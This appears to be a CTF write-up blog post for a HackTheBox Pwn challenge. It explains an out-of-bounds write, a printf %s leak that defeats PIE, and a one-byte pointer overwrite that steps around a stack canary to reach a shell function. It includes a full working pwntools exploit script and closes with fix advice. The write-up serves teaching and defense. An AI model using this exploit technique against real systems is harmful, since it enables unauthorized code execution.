---
layout: post
title: "Contractor"
date: 2028-06-02 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, stack-canary, pie, ret2win, aslr, partial-overwrite, pwntools]
description: "A join-the-army form with a re-edit menu hides a 256-byte write into a 16-byte field. A printf %s over-reads the buffer to leak PIE, and a one-byte overwrite of the loop's own buffer pointer steers every later write around the stack canary onto the return address — no canary leak needed, just a little brute-force."
---

## Overview

Contractor is a **Medium** HackTheBox **Pwn** challenge — a 64-bit Linux binary with every modern mitigation on: Full RELRO, stack canary, NX, and PIE (glibc 2.31). It presents an interactive "join Sir Alaric's army" form (name, reason, age, specialty), all stored in one `alloca`'d stack buffer, plus a menu to re-edit each field. Two bugs in the re-edit path defeat all three protections and drop you into the built-in `contract()` function, which simply runs `execl("/bin/sh","sh",0)`.

## The technique

The binary contains a ready-made win function — `contract()` calling [`execl("/bin/sh",...)`](https://cwe.mitre.org/data/definitions/787.html) — so the whole challenge is getting control of `main`'s saved return address despite the canary and PIE.

**Bug 1 — the over-long re-edit ([out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html)).** Each field has a correctly bounded initial fill loop, but the menu's **"Specialty" re-edit (option 4)** copies up to `0xff` bytes into a slot that is only 16 bytes wide at offset `0x118` inside a `0x128`-byte buffer. That writes ~239 bytes past the end — far enough to reach the saved return address.

**Bug 2 — the `%s` over-read (PIE leak).** The intro `printf` echoes each field with `%s`, which stops only at a NUL byte. Fill every field completely with non-NUL bytes and the print runs off the end of the buffer, printing an adjacent saved `__libc_csu_init` pointer left on the stack. That gives the PIE base:

```python
pie_base = int.from_bytes(leak6, "little") - 0x1b50   # __libc_csu_init offset
contract = pie_base + 0x1343
```

**The canary bypass — steer, don't smash.** You cannot leak the canary (its own NUL byte halts `%s`), and a straight overflow would overwrite it and trip `__stack_chk_fail`. But the Specialty write loop reloads the destination **buffer pointer** from the stack (`mov rdx, [rbp-0x18]`) on *every* iteration. With `buf = rbp-0x150`, the write index that lands on that pointer is **32**, the canary is at **48**, and the saved RIP is at **64**. Overwrite only the *low byte* of the pointer at index 32, and every subsequent write is redirected — the cursor jumps clean over the canary onto the saved RIP, which is never guarded because the canary bytes are never touched.

`alloca` 16-aligns the buffer, so its low byte is one of 16 values and the byte you need is `old + 0x1f`. It re-randomizes each run, so you brute the 16 candidates. Trashing the loop's counter local along the way makes `main` return without the "Yes" confirmation.

## Solution

The exploit leaks PIE from the `%s` over-read, then brute-forces the 16 possible low-byte values (spraying `contract()` across the payload tail so a range of alignments land). Each guess needs a fresh connection because the low byte re-randomizes per process.

`solve.py`:

```python
#!/usr/bin/env python3
import sys, os
from pwn import *
context.log_level = 'error'
BINDIR = os.path.dirname(os.path.abspath(__file__))
elf = ELF(os.path.join(BINDIR, 'contractor'), checksec=False)

CSU_OFF      = 0x1b50   # __libc_csu_init
CONTRACT_OFF = 0x1343   # win: execl("/bin/sh","sh",0)

def start():
    return remote(sys.argv[1], int(sys.argv[2]))

def leak_base(p):
    p.recvuntil(b'> '); p.send(b'A'*16)              # name (16)
    p.recvuntil(b'> '); p.send(b'B'*256)             # reason (256)
    p.recvuntil(b'> '); p.send(b'9999999999999999\n')# age %ld, nonzero
    p.recvuntil(b'> '); p.send(b'C'*16)              # specialty (16) -> %s over-reads
    data = p.recvrepeat(0.4)
    i = data.rfind(b'C'*16)
    return int.from_bytes(data[i+16:i+16+6], 'little') - CSU_OFF

def attempt(nb):
    p = start()
    contract = leak_base(p) + CONTRACT_OFF
    p.recvuntil(b'> '); p.sendline(b'4')             # option 4 = Specialty re-edit
    p.recvuntil(b'> ')
    # i0..31 padding (also trashes counter), i32 = pointer LSB, then spray contract()
    p.send(b'D'*32 + bytes([nb & 0xff]) + p64(contract)*20 + b'\n')
    try:
        p.sendline(b'echo PWNED41312')
        p.recvuntil(b'PWNED41312', timeout=2)
        return p
    except Exception:
        p.close(); return None

for nb in [0x0f + 0x10*k for k in range(16)]:         # buffer is 16-aligned -> 16 candidates
    p = attempt(nb)
    if p:
        p.sendline(b'cat flag.txt')
        print(p.recvrepeat(1.5).decode(errors='replace'))
        break
```

Run it against the instance and one of the 16 guesses returns into `contract()`:

```bash
python3 solve.py <host> <port>
# ... nb=0x3f -> shell
# HTB{...}
```

## Why it worked

The re-edit path used a larger copy bound (`0xff`) than the field's real size (16 bytes) — a classic [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html), rooted in [improper validation of the array index](https://cwe.mitre.org/data/definitions/129.html). A `printf("%s", buf)` on a buffer that was never guaranteed NUL-terminated turned into an [information exposure](https://cwe.mitre.org/data/definitions/125.html) that defeated PIE. And because the vulnerable loop kept a *writable* base pointer in a stack slot it could itself overflow, a single-byte partial overwrite of that pointer redirected every later write around the canary — a stack-protector bypass with no canary leak at all.

## Fix / defense

- Bound every copy loop to the destination field's real size; never let a re-edit path use a larger limit than the initial fill.
- Never `printf("%s", buf)` on a buffer that is not guaranteed NUL-terminated — use a length-bounded print or terminate explicitly.
- Don't keep a writable base pointer in a stack slot that the same loop can overflow; recompute it from a register or place it below the overflowable region. Compile with `-fstack-protector-strong` and treat any warning about unbounded copies as a bug.
